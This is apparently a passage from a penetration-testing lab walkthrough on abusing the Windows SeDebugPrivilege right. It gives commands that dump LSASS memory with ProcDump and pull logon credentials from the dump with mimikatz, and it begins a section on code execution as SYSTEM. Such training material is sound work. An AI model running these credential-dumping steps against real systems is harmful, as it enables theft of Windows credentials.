![](SeDebugPrivilege-20260818-204614.png)

After logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.

```cmd
C:\htb> whoami /priv
```

We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory.

```cmd
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```cmd
C:\htb> mimikatz.exe

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
```

![](SeDebugPrivilege-20260818-204819.png)
## Remote Code Execution as SYSTEM

```powershell
PS C:\htb> tasklist
```

![](SeDebugPrivilege-20260818-204926.png)

![](SeDebugPrivilege-20260818-204931.png)
